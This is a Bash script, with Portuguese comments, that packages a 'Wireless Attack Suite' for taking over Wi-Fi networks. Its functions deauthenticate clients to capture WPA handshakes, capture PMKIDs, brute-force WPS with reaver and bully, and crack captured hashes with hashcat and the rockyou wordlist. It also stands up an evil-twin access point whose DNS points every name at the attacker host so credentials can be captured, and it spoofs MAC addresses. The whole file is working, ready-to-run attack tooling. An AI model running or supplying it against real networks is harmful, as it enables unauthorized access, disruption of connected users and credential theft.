#!/usr/bin/env bash
# V0rtexOS — Wireless Attack Suite
# Ataques completos a redes Wi-Fi
# Uso: wireless-attack.sh <modo> [args]

set -euo pipefail

RED='\033[1;31m' GRN='\033[1;32m' CYN='\033[1;36m' YEL='\033[1;33m' RST='\033[0m'
ok()  { echo -e "${GRN}[+]${RST} $*"; }
log() { echo -e "${CYN}[*]${RST} $*"; }
err() { echo -e "${RED}[!]${RST} $*"; }

LOOT="/tmp/aeternus-wireless"
mkdir -p "$LOOT"

# ── Detectar interface wireless ───────────────────
detect_iface() {
    iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | head -1
}

# ── Modo monitor ──────────────────────────────────
monitor_on() {
    local iface="${1:-$(detect_iface)}"
    [[ -z "$iface" ]] && { err "Interface wireless não encontrada"; exit 1; }
    log "Ativando modo monitor em $iface"
    ip link set "$iface" down
    iw dev "$iface" set type monitor
    ip link set "$iface" up
    # Matar processos que interferem
    airmon-ng check kill &>/dev/null || true
    ok "Monitor mode ativo: $iface"
    echo "$iface"
}

monitor_off() {
    local iface="${1:-$(detect_iface)}"
    log "Desativando modo monitor em $iface"
    ip link set "$iface" down
    iw dev "$iface" set type managed
    ip link set "$iface" up
    systemctl start NetworkManager &>/dev/null || true
    ok "Modo managed restaurado: $iface"
}

# ── Scan de redes ─────────────────────────────────
scan_networks() {
    local iface="${1:-$(detect_iface)}"
    log "Escaneando redes Wi-Fi via $iface"
    monitor_on "$iface" &>/dev/null
    airodump-ng "$iface" --output-format csv \
        -w "$LOOT/scan" --write-interval 5 &
    SCAN_PID=$!
    log "Escaneando por 15 segundos..."
    sleep 15
    kill $SCAN_PID 2>/dev/null
    cat "$LOOT/scan-01.csv" 2>/dev/null | head -30
    ok "Scan salvo em $LOOT/scan-01.csv"
}

# ── Captura de Handshake WPA/WPA2 ────────────────
capture_handshake() {
    local iface="${1:?}" bssid="${2:?}" channel="${3:?}" \
          output="${4:-$LOOT/handshake}"
    log "Capturando handshake WPA de $bssid (ch $channel)"
    monitor_on "$iface" &>/dev/null

    # Iniciar captura
    airodump-ng "$iface" \
        --bssid "$bssid" \
        --channel "$channel" \
        -w "$output" \
        --output-format pcap &
    DUMP_PID=$!

    # Deauth para forçar reconexão
    sleep 3
    log "Enviando deauth para forçar reconexão..."
    aireplay-ng --deauth 10 -a "$bssid" "$iface" &>/dev/null

    # Aguardar handshake
    log "Aguardando handshake (30s max)..."
    sleep 30
    kill $DUMP_PID 2>/dev/null

    if aircrack-ng "${output}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
        ok "Handshake capturado: ${output}-01.cap"
        log "Quebre com: aircrack-ng ${output}-01.cap -w /opt/wordlists/rockyou.txt"
        log "Ou converta para hashcat: hcxpcapngtool -o hash.hc22000 ${output}-01.cap"
    else
        err "Handshake não capturado. Tente novamente."
    fi
}

# ── PMKID Attack (sem cliente) ────────────────────
pmkid_attack() {
    local iface="${1:?}" bssid="${2:?}"
    log "PMKID Attack em $bssid (não requer cliente conectado)"
    monitor_on "$iface" &>/dev/null

    log "Capturando PMKID com hcxdumptool..."
    hcxdumptool -i "$iface" \
        --filterlist_ap="$bssid" \
        --filtermode=2 \
        -o "$LOOT/pmkid.pcapng" \
        --enable_status=1 &
    HCXDUMP_PID=$!
    sleep 60
    kill $HCXDUMP_PID 2>/dev/null

    log "Extraindo PMKID..."
    hcxpcapngtool -o "$LOOT/pmkid.hash" \
        --hccapx="$LOOT/pmkid.hccapx" \
        "$LOOT/pmkid.pcapng" 2>/dev/null

    if [[ -s "$LOOT/pmkid.hash" ]]; then
        ok "PMKID hash: $LOOT/pmkid.hash"
        ok "Quebre com: hashcat -m 22000 $LOOT/pmkid.hash /opt/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt --force"
    else
        err "PMKID não capturado. AP pode não ser vulnerável."
    fi
}

# ── WPS Pixie Dust Attack ─────────────────────────
wps_pixie() {
    local iface="${1:?}" bssid="${2:?}" channel="${3:?}"
    log "WPS Pixie Dust Attack em $bssid"
    monitor_on "$iface" &>/dev/null
    reaver -i "$iface" \
        -b "$bssid" \
        -c "$channel" \
        -K 1 \
        -vv \
        -o "$LOOT/wps-pixie-$bssid.txt" 2>&1 | tee /tmp/reaver.log
}

# ── WPS Brute Force (Bully) ───────────────────────
wps_brute() {
    local iface="${1:?}" bssid="${2:?}" channel="${3:?}"
    log "WPS Brute Force em $bssid (bully)"
    monitor_on "$iface" &>/dev/null
    bully "$iface" \
        -b "$bssid" \
        -c "$channel" \
        -S -F -B \
        2>&1 | tee "$LOOT/wps-bully-$bssid.txt"
}

# ── Evil Twin AP ───────────────────────────────────
evil_twin() {
    local ssid="${1:?}" iface="${2:?}" channel="${3:-6}"
    log "Criando Evil Twin AP: '$ssid' ch $channel"
    monitor_on "$iface" &>/dev/null

    # Configurar hostapd
    cat > /tmp/hostapd-evil.conf <<HOSTAPD
interface=$iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
HOSTAPD

    # Configurar DHCP e gateway falso
    cat > /tmp/dnsmasq-evil.conf <<DNSMASQ
interface=$iface
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=10.0.0.1
address=/#/10.0.0.1
DNSMASQ

    ip addr add 10.0.0.1/24 dev "$iface" 2>/dev/null || true
    ip link set "$iface" up
    echo 1 > /proc/sys/net/ipv4/ip_forward

    log "Iniciando Evil Twin AP (Ctrl+C para parar)..."
    log "Capture credenciais com: tcpdump -i $iface -w $LOOT/evil-twin.pcap"
    hostapd /tmp/hostapd-evil.conf &
    HOSTAPD_PID=$!
    sleep 2
    dnsmasq -C /tmp/dnsmasq-evil.conf --no-daemon &
    DNSMASQ_PID=$!

    trap "kill $HOSTAPD_PID $DNSMASQ_PID 2>/dev/null; monitor_off $iface" INT
    wait
}

# ── Crack de handshake ─────────────────────────────
crack_handshake() {
    local cap="${1:?Informe arquivo .cap/.pcapng}"
    local wordlist="${2:-/opt/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt}"
    log "Quebrando handshake: $cap"

    # Converter para formato hashcat
    local hash_file="${cap%.cap}.hc22000"
    hcxpcapngtool -o "$hash_file" "$cap" 2>/dev/null && \
        ok "Convertido para hashcat: $hash_file" || \
        hash_file="$cap"

    log "Usando hashcat (modo 22000)..."
    hashcat -m 22000 \
        "$hash_file" \
        "$wordlist" \
        --force \
        --status --status-timer=10 \
        -o "$LOOT/cracked.txt"

    if [[ -s "$LOOT/cracked.txt" ]]; then
        ok "SENHA ENCONTRADA:"
        cat "$LOOT/cracked.txt"
    fi
}

# ── MAC Spoofing ──────────────────────────────────
mac_spoof() {
    local iface="${1:?}" mac="${2:-random}"
    log "Spoofing MAC em $iface → $mac"
    ip link set "$iface" down
    if [[ "$mac" == "random" ]]; then
        macchanger -r "$iface"
    else
        macchanger -m "$mac" "$iface"
    fi
    ip link set "$iface" up
    ok "MAC atual: $(macchanger -s "$iface" | awk '/Current/{print $3}')"
}

usage() {
    echo -e "\n${CYN}V0rtexOS — Wireless Attack Suite${RST}"
    echo
    echo "Modos:"
    echo "  monitor-on    [iface]"
    echo "  monitor-off   [iface]"
    echo "  scan          [iface]"
    echo "  handshake     <iface> <bssid> <channel>"
    echo "  pmkid         <iface> <bssid>"
    echo "  wps-pixie     <iface> <bssid> <channel>"
    echo "  wps-brute     <iface> <bssid> <channel>"
    echo "  evil-twin     <ssid> <iface> [channel]"
    echo "  crack         <capfile> [wordlist]"
    echo "  mac-spoof     <iface> [mac|random]"
    echo
}

case "${1:-help}" in
    monitor-on)  shift; monitor_on "$@" ;;
    monitor-off) shift; monitor_off "$@" ;;
    scan)        shift; scan_networks "$@" ;;
    handshake)   shift; capture_handshake "$@" ;;
    pmkid)       shift; pmkid_attack "$@" ;;
    wps-pixie)   shift; wps_pixie "$@" ;;
    wps-brute)   shift; wps_brute "$@" ;;
    evil-twin)   shift; evil_twin "$@" ;;
    crack)       shift; crack_handshake "$@" ;;
    mac-spoof)   shift; mac_spoof "$@" ;;
    *)           usage ;;
esac
